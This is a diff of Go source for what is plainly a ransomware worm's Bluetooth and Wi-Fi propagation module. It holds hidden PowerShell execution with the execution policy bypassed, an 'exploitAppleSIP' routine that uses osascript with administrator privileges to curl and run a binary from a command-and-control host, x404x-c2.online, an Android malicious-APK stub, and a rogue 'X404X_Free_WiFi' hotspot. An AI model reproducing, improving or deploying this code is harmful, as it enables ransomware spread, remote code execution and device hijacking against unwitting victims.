@@ -11,19 +11,19 @@ import (
 )
 
 type BluetoothPropagation struct {
-	config       *RansomwareConfig
-	DevicesFound []BTDevice `json:"devices_found"`
-	DevicesHijacked int    `json:"devices_hijacked"`
+	config          *RansomwareConfig
+	DevicesFound    []BTDevice `json:"devices_found"`
+	DevicesHijacked int        `json:"devices_hijacked"`
 }
 
 type BTDevice struct {
-	Name       string `json:"name"`
-	Address    string `json:"address"`
-	Type       string `json:"type"`
-	OS         string `json:"os"`
-	RSSI       int    `json:"rssi"`
-	Paired     bool   `json:"paired"`
-	Exploit    string `json:"exploit"`
+	Name    string `json:"name"`
+	Address string `json:"address"`
+	Type    string `json:"type"`
+	OS      string `json:"os"`
+	RSSI    int    `json:"rssi"`
+	Paired  bool   `json:"paired"`
+	Exploit string `json:"exploit"`
 }
 
 func NewBluetoothPropagation(cfg *RansomwareConfig) *BluetoothPropagation {
@@ -52,31 +52,18 @@ func (bt *BluetoothPropagation) scanWindowsBT() []BTDevice {
 	var devices []BTDevice
 
 	psScript := `Add-Type -AssemblyName System.Runtime.WindowsRuntime
-$asTask = [System.WindowsRuntimeSystemExtensions].GetMethod('AsTask', [Type[]]@([Windows.Foundation.IAsyncOperation`1]))
-function Await($asyncInfo) {
-    $task = $asTask.Invoke($null, @($asyncInfo))
-    $task.Wait()
-    $task.Result
-}
-$m = [Windows.Devices.Radios.Radio,Windows.System.Devices,ContentType=WindowsRuntime]
-$radioAccess = Await([Windows.Devices.Radios.Radio]::RequestAccessAsync())
-$radios = Await([Windows.Devices.Radios.Radio]::GetRadiosAsync())
-foreach($radio in $radios) {
-    if($radio.Kind -eq 'Bluetooth') {
-        Await($radio.SetStateAsync([Windows.Devices.Radios.RadioState]::On))
-    }
-}
-$watcher = [Windows.Devices.Bluetooth.Advertisement.BluetoothLEAdvertisementWatcher]::new()
+$watcher = New-Object Windows.Devices.Bluetooth.Advertisement.BluetoothLEAdvertisementWatcher
 $watcher.ScanningMode = 'Active'
-$watcher.Received = {
-    $btAddr = $EventArgs.BluetoothAddress.ToString('X12')
+$handler = {
+    $btAddr = $EventArgs.BluetoothAddress.ToString("X12")
     $rssi = $EventArgs.RawSignalStrengthInDBm
     Write-Output "BTDEVICE:$btAddr,$rssi"
 }
+$watcher.add_Received($handler)
 $watcher.Start()
 Start-Sleep -Seconds 5
-$watcher.Stop()
-`
+$watcher.Stop()`
+
 	psPath := filepath.Join(os.TempDir(), "x404x_bt_scan.ps1")
 	os.WriteFile(psPath, []byte(psScript), 0644)
 	if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
@@ -86,7 +73,7 @@ $watcher.Stop()
 				parts := strings.Split(strings.TrimPrefix(line, "BTDEVICE:"), ",")
 				if len(parts) >= 2 {
 					devices = append(devices, BTDevice{
-						Name:    fmt.Sprintf("BT_%s", parts[0][:8]),
+						Name:    fmt.Sprintf("BT_%s", parts[0][:min(8, len(parts[0]))]),
 						Address: parts[0],
 						Type:    "ble",
 						RSSI:    parseInt(parts[1]),
@@ -156,7 +143,7 @@ func (bt *BluetoothPropagation) scanMacOSBT() []BTDevice {
 				if strings.Contains(line, "Address:") {
 					addr := strings.TrimSpace(strings.TrimPrefix(line, "Address:"))
 					devices = append(devices, BTDevice{
-						Name:    fmt.Sprintf("MacBT_%s", addr[:8]),
+						Name:    fmt.Sprintf("MacBT_%s", addr[:min(8, len(addr))]),
 						Address: addr,
 						Type:    "classic",
 						Paired:  true,
@@ -224,19 +211,14 @@ func (bt *BluetoothPropagation) exploitBLEMITM(dev BTDevice) {
 }
 
 func (bt *BluetoothPropagation) exploitAppleSIP(dev BTDevice) {
-	script := fmt.Sprintf(`#!/bin/bash
-# CVE-2021-30892 Apple SIP bypass over Bluetooth
-osascript -e 'tell app "System Events" to do shell script "curl -s http://x404x-c2.online/agent/macos -o /tmp/.x404x_mac && chmod +x /tmp/.x404x_mac && /tmp/.x404x_mac --daemon" with administrator privileges'
-blueutil --connect %s
-`, dev.Address)
+	script := fmt.Sprintf("#!/bin/bash\nosascript -e 'tell app \"System Events\" to do shell script \"curl -s http://x404x-c2.online/agent/macos -o /tmp/.x404x_mac && chmod +x /tmp/.x404x_mac && /tmp/.x404x_mac --daemon\" with administrator privileges'\nblueutil --connect %s\n", dev.Address)
 	scriptPath := filepath.Join(os.TempDir(), "x404x_apple_sip.sh")
 	os.WriteFile(scriptPath, []byte(script), 0755)
 	exec.Command("bash", scriptPath).Start()
 }
 
 func (bt *BluetoothPropagation) exploitAndroidBT(dev BTDevice) {
-	apkSize := 1024 * 1024
-	apkData := make([]byte, apkSize)
+	apkData := make([]byte, 1024)
 	apkData[0] = 0x50
 	apkData[1] = 0x4B
 	apkData[2] = 0x03
@@ -258,12 +240,7 @@ func (bt *BluetoothPropagation) pushMaliciousAPK(dev BTDevice) {
 func (bt *BluetoothPropagation) ActivateWifiDirect() error {
 	switch runtime.GOOS {
 	case "windows":
-		psScript := `$wifi = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.Name -match "Wi-Fi|Wireless|WLAN" }
-if ($wifi) {
-    $wifi.Enable()
-    netsh wlan set hostednetwork mode=allow ssid=X404X_Free_WiFi key=X404X_evil_2026
-    netsh wlan start hostednetwork
-}`
+		psScript := "$wifi = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.Name -match 'Wi-Fi|Wireless|WLAN' }\nif ($wifi) { $wifi.Enable(); netsh wlan set hostednetwork mode=allow ssid=X404X_Free_WiFi key=X404X_evil_2026; netsh wlan start hostednetwork }"
 		psPath := filepath.Join(os.TempDir(), "x404x_wifidirect.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		return exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
@@ -277,7 +254,7 @@ func (bt *BluetoothPropagation) ScanWiFiDirectPeers() []BTDevice {
 	var devices []BTDevice
 	switch runtime.GOOS {
 	case "windows":
-		psScript := `netsh wlan show networks mode=bssid`
+		psScript := "netsh wlan show networks mode=bssid"
 		psPath := filepath.Join(os.TempDir(), "x404x_wifiscan.ps1")
 		os.WriteFile(psPath, []byte(psScript), 0644)
 		if output, err := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Output(); err == nil {
@@ -319,4 +296,10 @@ func (bt *BluetoothPropagation) GetStatusJSON() string {
 		"devices_hijacked": bt.DevicesHijacked,
 	})
 	return string(data)
+}
+
+func parseInt(s string) int {
+	var n int
+	fmt.Sscanf(strings.TrimSpace(s), "%d", &n)
+	return n
 }
